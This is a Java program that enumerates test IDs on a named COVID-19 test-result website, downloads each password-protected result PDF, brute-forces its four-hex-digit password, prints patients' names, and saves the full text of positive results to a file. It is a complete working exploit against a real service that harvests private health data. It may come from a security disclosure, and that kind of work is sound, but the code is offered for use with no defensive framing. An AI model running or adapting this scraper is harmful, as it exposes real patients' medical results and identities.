package net.pierlings;

import com.google.common.base.Strings;
import org.apache.commons.io.FileUtils;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.text.PDFTextStripper;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.UUID;

public class CoronapointTestDownload {
    private static Path path;

    public static void main(String[] args) throws IOException {
        final int startTestId = 5041749;
        final int endTestId = 5069688;
        path = Paths.get("src/main/resources/positive_results_" + System.currentTimeMillis() + ".txt");
        final String urlPattern = "https://e.coronapoint.de/result.php?testid=%s&uuid=%s}";

        for (int i=startTestId; i<endTestId; i++) {
            System.out.println("Checking testId " + i);
            final URL url = new URL(String.format(urlPattern, i, UUID.randomUUID()));
            final HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            if (connection.getContentType().equals("application/pdf")) {
                final File file = new File("src/main/resources/temp.pdf");
                FileUtils.copyURLToFile(url, file);
                bruteForcePassword(file, i);
            } else {
                System.out.println("TestId " + i + " was not a PDF document, continuing with next test...");
            }
        }
    }

    private static void bruteForcePassword(final File file, final int testId) throws IOException {
        final long start = System.currentTimeMillis();
        boolean passwordFound = false;
        String password = null;
        int i = -1;
        PDDocument document = null;

        while (!passwordFound || i == 65535) {
            i++;
            password = Strings.padStart(Integer.toHexString(i), 4, '0').toUpperCase();
            try {
                document = PDDocument.load(file, password);
                passwordFound = true;
            } catch (Exception e) {
                // Empty
            }
        }

        final long end = System.currentTimeMillis();
        System.out.println("Password found for testId [" + testId + "]: " + password + ", took " + (end-start) + "ms");

        lookForPositiveResult(document);
    }

    private static void lookForPositiveResult(final PDDocument document) throws IOException {
        final PDFTextStripper stripper = new PDFTextStripper();
        final String text = stripper.getText(document);

        if (text.contains("NEGATIV")) {
            System.out.println(text.substring(text.indexOf("Name:"), text.indexOf("Adresse")-1));
            System.out.println("Negative result, continuing with next result...");
        } else if (text.contains("POSITIV")) {
            System.out.println(text);
            Files.writeString(path, text + "\n----------------------------------------------------------------\n", StandardOpenOption.APPEND, StandardOpenOption.CREATE);
        } else {
            System.out.println("Unknown test result, continuing with next result...");
        }

        document.close();
    }
}
